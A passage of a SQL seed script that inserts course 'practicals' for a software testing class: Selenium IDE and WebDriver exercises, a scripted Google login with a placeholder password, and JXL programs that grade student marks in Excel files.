    $json$["Step 1: Install Mozilla Firefox if not already installed.","Step 2: Navigate to https://addons.mozilla.org/en-US/firefox/addon/selenium-ide/","Step 3: Click the \"Add to Firefox\" / Add Extension button.","Step 4: Once installed, open Mozilla Firefox.","Step 5: Click on the Extensions (Puzzle Piece) button in the top-right corner and select Selenium IDE.","Step 6: The Selenium IDE welcome window will pop up.","Step 7: Click on \"Create a new project\".","Step 8: Enter the project name as `SQTA Prac1` and click OK.","Step 9: Enter the Base URL `http://demo.guru99.com/test/newtours/` and click Start Recording.","Step 10: The Mercury Tours demo site opens in Firefox with \"Selenium IDE is recording...\" indicator.","Step 11: Right-click on the page -> Select \"Selenium IDE\" -> Select \"Assert\" -> Select \"Title\".","Step 12: In the \"User Name\" text box of Mercury Tours, type `\"invalidUNN\"`, and in the \"Password\" text box, type `\"invalidPWD\"`.","Step 13: Click the \"Submit\" / \"Sign-In\" button.","Step 14: Stop recording in Selenium IDE and save the test case.","Step 15: Rename the test case as `\"youtube\"` (or `\"MercuryTours\"`) and click Save.","Step 16: Notice that the project file is saved with a `.side` extension.","Step 17: Click the Playback (Run current test) button in Selenium IDE to replicate all recorded actions.","Step 18-21: Repeat the recording and playback process for 3 additional websites to complete 4 test cases in the suite: (1) `http://www.youtube.com` (youtube Case), (2) `https://www.yahoo.in` (Yahoo Case), and (3) `https://www.google.com` (Google Case)."]$json$::jsonb,
    $json$["Uses Selenium IDE browser extension in Mozilla Firefox and saves the test suite as a `.side` file."]$json$::jsonb,
    ARRAY[$item$selenium ide$item$, $item$test suite$item$, $item$4 test cases$item$, $item$guru99$item$, $item$newtours$item$, $item$.side$item$, $item$firefox extension$item$, $item$stqa practical 1$item$]::text[],
    ARRAY[$item$STQA Practical 1$item$, $item$Install Selenium IDE and Write 4 Test Cases$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 2, 3, 4, 5, 6]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 2: Conduct a Test Suite Using Selenium IDE (Assert & Verify Title, Text, Element Present) (source_key: stqa-practical-2)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000002',
    $skey$stqa-practical-2$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    2,
    $title$Conduct a Test Suite Using Selenium IDE (Assert & Verify Title, Text, Element Present)$title$,
    $q$Conduct a test suite for two different websites using Selenium IDE. Perform various actions like clicking links, filling forms, and verifying content$q$,
    NULL,
    NULL,
    $lang$Selenium IDE$lang$,
    $out$Selenium IDE Project "STQA Prac2" with passing valid test cases (valid_assert_title, valid_verify_title, valid_assert_text, valid_verify_text, verify_element_present) and expected failure logs on invalid test cases (invalid_assert_title, invalid_verify_title, invalid_assert_text, invalid_verify_text, invalid_verify_element_present).$out$,
    '[]'::jsonb,
    $json$["PART 1 — CHECKING ASSERT TITLE COMMAND:","Step 1-2: Open Mozilla Firefox and launch Selenium IDE (Project: `STQA Prac2`).","Step 3: Set Base URL to `https://www.google.com/` and start recording.","Step 4: Search `\"selenium IDE\"` in the Google search bar.","Step 5: Click the first link to open the Selenium IDE page.","Step 6: Right-click -> Selenium IDE -> Assert -> Title.","Step 7: Save the test case as `\"valid_assert_title\"`.","Step 8-9: Create a new test case named `\"invalid_assert_title\"`, repeat Steps 3-6, change the expected Title value so it mismatches, and run the test.","PART 2 — CHECKING VERIFY TITLE COMMAND:","Step 1-3: Repeat the steps above using `Verify -> Title` instead of `Assert -> Title` and save test cases as `\"valid_verify_title\"` and `\"invalid_verify_title\"`.","PART 3 — CHECKING ASSERT TEXT COMMAND:","Step 1-6: Create test `\"valid_assert_text\"`, record from `https://www.google.com/`, search `\"Selenium IDE\"`, open the first site, highlight text on the page, right-click -> Selenium IDE -> Assert -> Text, and save.","Step 7-11: Create test `\"invalid_assert_text\"`, repeat Steps 1-4, assert text on the heading, change the Value field to `\"Selenese\"` instead of `\"Selenium IDE\"`, stop recording, and run.","PART 4 — CHECKING VERIFY TEXT COMMAND:","Step 1-4: Repeat the steps for Assert Text using `Verify -> Text` to create `\"valid_verify_text\"` and `\"invalid_verify_text\"` (with Value set to `\"Selenese\"`).","PART 5 — CHECKING VERIFY ELEMENT PRESENT COMMAND:","Step 1-4: Create test `\"verify_element_present\"`, record basic navigation, right-click -> Selenium IDE -> Verify -> Element Present, stop recording, and run.","Step 5-6: Create `\"invalid_verify_element_present\"`, modify the target locator to a non-existent element, and run the test."]$json$::jsonb,
    $json$["Demonstrates the difference between `assert` (aborts test execution on failure) and `verify` (logs failure and continues test execution) in Selenium IDE."]$json$::jsonb,
    ARRAY[$item$selenium ide$item$, $item$assert title$item$, $item$verify title$item$, $item$assert text$item$, $item$verify text$item$, $item$verify element present$item$, $item$selenese$item$, $item$stqa practical 2$item$]::text[],
    ARRAY[$item$STQA Practical 2$item$, $item$Selenium IDE Assert vs Verify Commands$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 7, 8, 9, 10, 11, 12]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 3: Install Selenium Server (Selenium RC / WebDriver) and Configure Eclipse IDE (source_key: stqa-practical-3)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000003',
    $skey$stqa-practical-3$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    3,
    $title$Install Selenium Server (Selenium RC / WebDriver) and Configure Eclipse IDE$title$,
    $q$Install Selenium Server (Selenium RC) and demonstrate its usage by executing a script in Java or PHP to automate browser actions.$q$,
    NULL,
    NULL,
    $lang$Java / Eclipse Setup$lang$,
    $out$Java project "Project4" with package "BrowserStack" and class "Project" configured in Eclipse IDE with Selenium 3.141.59 Client Combined JARs and lib dependencies added to the Java Build Path.$out$,
    '[]'::jsonb,
    $json$["Step 1: Install Java SE Development Kit (JDK 16.0.2 / JDK 21) for Windows x64.","Step 2: Run the Windows x64 JDK Installer executable and follow the setup wizard.","Step 3: Download and install Eclipse IDE for Java Developers.","Step 4: Download the Selenium Server / Selenium Java Client Driver files.","Step 5: Download Browser Drivers (ChromeDriver for Chrome, GeckoDriver for Firefox, SafariDriver, IEDriverServer, MSEdgeDriver) and add their directory to the system PATH.","Step 6: Download Selenium Java Language Bindings (Version 3.141.59).","Step 7-8: Install and launch `eclipse.exe`.","Step 9: Select a workspace directory (e.g., `C:\\BrowserStack` or `C:\\Users\\DELL\\eclipse-workspace`) and click Launch.","Step 10: Create a new Java Project in Eclipse via `File -> New -> Java Project`.","Step 11: Right-click the `src` folder -> `New -> Package` and name it `BrowserStack`.","Step 12: Right-click the `BrowserStack` package -> `New -> Class`, name it `Project`, check `public static void main(String[] args)`, and click Finish.","Step 13: Right-click the Project folder -> `Properties -> Java Build Path -> Libraries -> Classpath -> Add External JARs...`, add `client-combined-3.141.59.jar` and all JARs inside the `libs` folder (`byte-buddy`, `commons-exec`, `guava`, `okhttp`, `okio`), then click Apply and Close."]$json$::jsonb,
    $json$["Note: Practical 3 in the STQA PDF covers the complete JDK, Eclipse, Browser Driver, and Selenium JAR build-path configuration. The executable WebDriver login script follows immediately in Practical 4."]$json$::jsonb,
    ARRAY[$item$selenium server$item$, $item$selenium rc$item$, $item$eclipse setup$item$, $item$java build path$item$, $item$client-combined-3.141.59.jar$item$, $item$geckodriver$item$, $item$browserstack$item$]::text[],
    ARRAY[$item$STQA Practical 3$item$, $item$Install Selenium Server and Configure Eclipse Java Project$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 13, 14, 15, 16]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 4: Automate Web Page Login Process Using Selenium WebDriver (source_key: stqa-practical-4)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000004',
    $skey$stqa-practical-4$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    4,
    $title$Automate Web Page Login Process Using Selenium WebDriver$title$,
    $q$Write a program using Selenium WebDriver to automate the login process on a specific web page. Verify successful login with appropriate assertions$q$,
    $code$package Prac3;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

public class P3 {
    public static void main(String[] args) throws InterruptedException {
        System.setProperty(
            "webdriver.gecko.driver",
            "D:\\STQA\\Mozilla Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe"
        );

        WebDriver driver = new FirefoxDriver();
        driver.get("https://accounts.google.com/");

        driver.findElement(By.id("identifierId"))
            .sendKeys("debo123@gmail.com"); // enter username
        driver.findElement(By.id("identifierNext")).click();

        Thread.sleep(500);

        driver.findElement(By.name("password"))
            .sendKeys("TYPE_YOUR_PASSWORD"); // enter password
        driver.findElement(By.id("passwordNext")).click();

        String title = driver.getTitle();
        if (title.equals("Google Account")) {
            System.out.println("LOGIN SUCCESSFUL...");
        } else {
            System.out.println("LOGIN FAILED");
        }
    }
}$code$,
    $orig$package Prac3; import org.openqa.selenium.By; import org.openqa.selenium.WebDriver; import org.openqa.selenium.firefox.FirefoxDriver; public class P3 {
public static void main(String[] args) throws InterruptedException {
    System.setProperty(
        "webdriver.gecko.driver",
        "D:\\STQA\\Mozilla Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe"
    );
    WebDriver driver = new FirefoxDriver();
    Driver.get("https://accounts.google.com/");
    driver.findElement(By.id("identifierId"))
        .sendKeys("debo123@gmail.com"); // enter username
    driver.findElement(By.id("identifierNext")).click();
    Thread.sleep(500)
    driver.findElement(By.name("password"))
        .sendKeys("TYPE_YOUR_PASSWORD"); // enter password
    driver.findElement(By.id("passwordNext")).click();
    String title = driver.getTitle()
    if (title.equals("Google Account")) {
        System.out.println("LOGIN SUCCESSFUL...");
    } else {
        System.out.println("LOGIN FAILED");
    }
}
}$orig$,
    $lang$Java$lang$,
    $out$Firefox launches https://accounts.google.com/, populates email field, clicks Next, and prints "LOGIN SUCCESSFUL..." or "LOGIN FAILED" based on page title assertion.$out$,
    $json$["Configure the GeckoDriver path using System.setProperty(\"webdriver.gecko.driver\", \"...\").","Instantiate WebDriver driver = new FirefoxDriver() and navigate to \"https://accounts.google.com/\".","Locate the email input via By.id(\"identifierId\"), send the email string, and click By.id(\"identifierNext\").","Wait 500ms using Thread.sleep(500), locate By.name(\"password\"), enter the password, and click By.id(\"passwordNext\").","Retrieve the page title via driver.getTitle() and compare against \"Google Account\" to print LOGIN SUCCESSFUL... or LOGIN FAILED."]$json$::jsonb,
    $json$["Create a new Java Project in Eclipse and add the Selenium WebDriver JARs to the build path.","Create package `Prac3` and class `P3`.","Update the `webdriver.gecko.driver` path to match your local `geckodriver.exe` location and run as a Java Application."]$json$::jsonb,
    $json$["Conservative correction applied: fixed `Driver.get(...)` (capital D) -> `driver.get(...)` and added missing semicolons after `Thread.sleep(500);` and `driver.getTitle();`."]$json$::jsonb,
    ARRAY[$item$selenium webdriver$item$, $item$login automation$item$, $item$firefoxdriver$item$, $item$identifierid$item$, $item$geckodriver$item$, $item$accounts.google.com$item$, $item$p3$item$]::text[],
    ARRAY[$item$STQA Practical 4$item$, $item$Automate Login Process using Selenium WebDriver$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 17, 18]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 5: Update 10 Student Records in an Excel File (JXL API) (source_key: stqa-practical-5)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000005',
    $skey$stqa-practical-5$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    5,
    $title$Update 10 Student Records in an Excel File (JXL API)$title$,
    $q$Write a program using Selenium WebDriver to update 10 student records in an Excel file. Perform data manipulation and verification.$q$,
    $code$import java.io.File;
import jxl.Sheet;
import jxl.Workbook;
import jxl.write.Label;
import jxl.write.WritableSheet;
import jxl.write.WritableWorkbook;

public class Result {
    public static void main(String[] args) throws Exception {
        Workbook wb = Workbook.getWorkbook(new File("input.xls"));
        Sheet s = wb.getSheet(0);
        WritableWorkbook wwb = Workbook.createWorkbook(new File("output.xls"));
        WritableSheet ws = wwb.createSheet("Result", 0);
        String[][] a = new String[s.getRows()][s.getColumns()];

        for (int i = 0; i < s.getRows(); i++) {
            for (int j = 0; j < s.getColumns(); j++) {
                a[i][j] = s.getCell(j, i).getContents();
                Label l2 = new Label(j, i, a[i][j]);
                ws.addCell(l2);
            }
        }

        Label l1 = new Label(6, 0, "Result");
        ws.addCell(l1);

        for (int i = 1; i < s.getRows(); i++) {
            for (int j = 2; j < s.getColumns(); j++) {
                a[i][j] = s.getCell(j, i).getContents();
                int x = Integer.parseInt(a[i][j]);
                if (x > 35) {
                    Label result = new Label(6, i, "pass");
                    ws.addCell(result);
                } else {
                    Label result = new Label(6, i, "fail");
                    ws.addCell(result);
                    break;
                }
            }
        }

        System.out.println("Records successfully updated");

        // Save the Excel file
        wwb.write();

        // Close files
        wwb.close();
        wb.close();
    }
}$code$,
    $orig$import java.io.File; import jxl.Sheet; import jxl.Workbook;
import jxl.write.Label; import jxl.write.WritableSheet; import jxl.write.WritableWorkbook;
public class Result {
    public static void main(String[] args) throws Exception {
        Workbook wb = Workbook.getWorkbook(new File("input.xls"));
        Sheet s = wb.getSheet(0);
        WritableWorkbookwwb = Workbook.createWorkbook(new File("output.xls"));
        WritableSheet ws = wwb.createSheet("Result", 0);
        String[[] a = new String[s.getRows()][s.getColumns()];
        for (int i = 0; i < s.getRows(); i++) {
            for (int j = 0; j < s.getColumns(); j++) {
                a[i][j] = s.getCell(j, i).getContents();
                Label l2 = new Label(j, i, a[i][j]);
                ws.addCell(l2);
            }
        }
        Label l1 = new Label(6, 0, "Result");
        ws.addCell(l1);
        for (int i = 1; i < s.getRows(); i++) {
            for (int j = 2; j < s.getColumns(); j++) {
                a[i][j] = s.getCell(j, i).getContents();
                int x = Integer.parseInt(a[i][j]);
                if (x > 35) {
                    Label result = new Label(6, i, "pass");
                    ws.addCell(result);
                } else {
                    Label result = new Label(6, i, "fail");
                    ws.addCell(result);
                    break;
                }
            }
        }
        System.out.println("Records successfully updated");
        // Save the Excel file
        wwb.write();
        // Close files
        wwb.close();
        wb.close();
    }
}$orig$,
    $lang$Java$lang$,
    $out$Records successfully updated
(Generates output.xls with Roll No 1..10, Java, DBMS, OS, Total, and Result column containing pass/fail for each student).$out$,
    $json$["Open input.xls using JXL Workbook.getWorkbook(new File(\"input.xls\")) and read Sheet 0.","Create output.xls using Workbook.createWorkbook() and create sheet \"Result\".","Copy all existing cells from input.xls into output.xls and add header Label(6, 0, \"Result\").","For each student row i (1 to rows-1), parse subject scores in columns j >= 2: if all scores > 35, write \"pass\" in column 6; if any score <= 35, write \"fail\" and break out of the inner loop.","Write and close the workbook and print \"Records successfully updated\"."]$json$::jsonb,
    $json$["Step 1: Download `jxl.jar` from https://sourceforge.net/projects/jexcelapi/ (or jexc).","Step 2: Create an Excel file `input.xls` (saved in `.xls` 97-2003 format) with 10 student records (Roll No, Java, DBMS, OS, Total).","Step 3: Install TestNG plugin in Eclipse via Help -> Eclipse Marketplace or Install New Software (`https://testng.org/testng-eclipse-update-site`).","Step 4-7: Create a new Java Project and class `Result` (or `StudentRecord`).","Step 8-10: Add `jxl.jar` and Selenium JARs to the Project Build Path -> Classpath.","Step 13-14: Run the code to generate `output.xls` with updated pass/fail results."]$json$::jsonb,
    $json$["Requires `jxl.jar` on the classpath and `input.xls` saved in `.xls` format (JXL does not support `.xlsx`).","Conservative correction applied: fixed `WritableWorkbookwwb` -> `WritableWorkbook wwb` and `String[[] a` -> `String[][] a`."]$json$::jsonb,
    ARRAY[$item$excel$item$, $item$update 10 student records$item$, $item$jxl$item$, $item$writableworkbook$item$, $item$input.xls$item$, $item$output.xls$item$, $item$studentrecord$item$, $item$result$item$]::text[],
    ARRAY[$item$STQA Practical 5$item$, $item$Update 10 Student Records in Excel using Java JXL$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 19, 20, 21, 22, 23, 24, 25, 26]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 6: Select Students Who Scored More Than 60 in Any/All Subjects (Excel + TestNG) (source_key: stqa-practical-6)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000006',
    $skey$stqa-practical-6$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    6,
    $title$Select Students Who Scored More Than 60 in Any/All Subjects (Excel + TestNG)$title$,
    $q$Write a program using Selenium WebDriver to select the number of students who have scored more than 60 in any one subject (or all subjects). Perform data extraction and analysis.$q$,
    $code$package StudentScore;

import jxl.Sheet;
import jxl.Workbook;
import jxl.write.*;
import java.io.*;
import org.testng.annotations.Test;

@Test
public class StudentScore {
    public void testImportexport1() throws Exception {
        FileInputStream fi = new FileInputStream("C:\\Users\\Rushi\\Desktop\\Student.xls");
        Workbook w = Workbook.getWorkbook(fi);
        Sheet s = w.getSheet(0);
        String a[][] = new String[s.getRows()][s.getColumns()];

        FileOutputStream fo = new FileOutputStream("C:\\Users\\Rushi\\Desktop\\Result.xls");
        WritableWorkbook wwb = Workbook.createWorkbook(fo);
        WritableSheet ws = wwb.createSheet("result", 0);
        int c = 0;

        for (int i = 0; i < s.getRows(); i++) {
            for (int j = 0; j < s.getColumns(); j++) {
                if (i >= 1) {
                    String b = s.getCell(3, i).getContents();
                    int x = Integer.parseInt(b);
                    if (x < 60) {
                        c++;
                        break;
                    }
                }
                a[i][j] = s.getCell(j, i).getContents();
                Label l2 = new Label(j, i - c, a[i][j]);
                ws.addCell(l2);
            }
        }

        System.out.println("Students scored less than 60: " + c);
        wwb.write();
        wwb.close();
    }
}$code$,
    $orig$package StudentScore; import jxl.Sheet; import jxl.Workbook;
import jxl.write.*; import java.io.*; import org.testng.annotations.Test;
@Test public class StudentScore {
    public void testImportexport1() throws Exception {
        FileInputStream fi = new FileInputStream("C:\Users\Rushi\Desktop\Student.xls");
        Workbook w = Workbook.getWorkbook(fi);
        Sheet s = w.getSheet(0);
        String a[][] = new String[s.getRows()][s.getColumns()];
        FileOutputStream fo = new FileOutputStream("C:\Users\Rushi\Desktop\Result.xls");
        WritableWorkbook wwb = Workbook.createWorkbook(fo);
        WritableSheet ws = wwb.createSheet("result", 0); int c = 0;
        for (int i = 0; i < s.getRows(); i++) {
            for (int j = 0; j < s.getColumns(); j++) {
                if (i >= 1) {
                    String b = new String();
                    b = s.getCell(3, i).getContents();
                    int x = Integer.parseInt(b);
                    if (x < 60) {
                        c++;
                        break;
                    }
                }
                a[i][j] = s.getCell(j, i).getContents();
                Label l2 = new Label(j, i - c, a[i][j]);
                ws.addCell(l2);
            }
        }
        System.out.println("Students scored less than 60: " + c);
        wwb.write(); wwb.close();
    }
}$orig$,
    $lang$Java$lang$,
    $out$Students scored less than 60: 8
Result.xls contains only students with score >= 60 (Roll No 4: Java 89, DBMS 76, OS 76, Total 241; Roll No 6: Java 45, DBMS 77, OS 67, Total 189).$out$,
    $json$["Open Student.xls via FileInputStream and JXL Workbook.getWorkbook(fi).","Create Result.xls via FileOutputStream and WritableWorkbook.createWorkbook(fo).","Iterate over all rows i and columns j: for student rows (i >= 1), inspect score in column 3 (OS score).","If score x < 60, increment skipped counter c and break out of the row loop so only students scoring >= 60 are written to Result.xls at compacted row index (i - c).","Write and close Result.xls and print the count."]$json$::jsonb,
    $json$["Step 1-3: Download `junit-4.10.jar`, `jxl-2.6.jar`, and install TestNG in Eclipse.","Step 4-5: Create `Student.xls` with 10 student records and an empty `Result.xls` file.","Step 6-11: Create Java project in Eclipse, create package `StudentScore` and class `StudentScore`, and add JXL + TestNG libraries to the build path.","Step 12-15: Run the TestNG test and inspect `Result.xls`."]$json$::jsonb,
    $json$["Conservative correction: escaped Windows backslashes (`\\\\`) in the Java string literals for `Student.xls` and `Result.xls`."]$json$::jsonb,
    ARRAY[$item$studentscore$item$, $item$scored more than 60$item$, $item$testng$item$, $item$jxl$item$, $item$student.xls$item$, $item$result.xls$item$, $item$data extraction$item$]::text[],
    ARRAY[$item$STQA Practical 6$item$, $item$Select Students Scoring More Than 60 in Excel$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 27, 28, 29, 30, 31, 32, 33, 34]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 7: Count Total Number of Objects / Links Available on a Web Page (source_key: stqa-practical-7)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000007',
    $skey$stqa-practical-7$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    7,
    $title$Count Total Number of Objects / Links Available on a Web Page$title$,
    $q$Write a program using Selenium WebDriver to provide the total number of objects present or available on a web page. Perform object identification and counting$q$,
    $code$import java.util.List;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

public class TestLinks {
    public static void main(String[] args) {
        System.setProperty(
            "webdriver.gecko.driver",
            "D:\\STQA\\Mozilla Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe"
        );
        WebDriver driver = new FirefoxDriver();
        driver.get("https://www.gmail.com");
        List<WebElement> mylist = driver.findElements(By.xpath("//a"));
        System.out.println("Number of links =" + mylist.size());
    }
}$code$,
    $orig$import java.util.List; import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver; import org.openqa.selenium.WebElement; import org.openqa.selenium.firefox.FirefoxDriver;
public class TestLinks {
    public static void main(String[] args) {
        System.setProperty("webdriver.gecko.driver","yourLocationToGeckoDriver\geckodriver.exe");
        WebDriver driver = new FirefoxDriver(); driver.get("https://www.gmail.com");
        List<WebElement> mylist = driver.findElements(By.xpath("//a"));
        System.out.println("Number of links =" + mylist.size());
    }
}$orig$,
    $lang$Java$lang$,
    $out$Number of links =4$out$,
    $json$["Set the system property `webdriver.gecko.driver` to the path of `geckodriver.exe`.","Launch Firefox using `WebDriver driver = new FirefoxDriver()` and navigate to `https://www.gmail.com`.","Find all anchor (`<a>`) elements on the page using `driver.findElements(By.xpath(\"//a\"))`.","Print the total count of web objects/links using `mylist.size()`."]$json$::jsonb,
    $json$["Step 1-5: Open Eclipse IDE, create Java Project `Links`, and create class `TestLinks` with `main`.","Step 6-10: Configure Build Path and add `client-combined-3.141.59.jar` and all JARs from `libs`.","Step 11-13: Enter the code, update the `geckodriver.exe` path, and run the project."]$json$::jsonb,
    $json$["Conservative correction: escaped the backslash in the Windows file path string literal."]$json$::jsonb,
    ARRAY[$item$total number of objects$item$, $item$number of links$item$, $item$testlinks$item$, $item$findelements$item$, $item$by.xpath("//a")$item$, $item$object identification$item$, $item$stqa practical 7$item$]::text[],
    ARRAY[$item$STQA Practical 7$item$, $item$Count Total Objects or Links on a Web Page using Selenium$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 35, 36, 37, 38]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
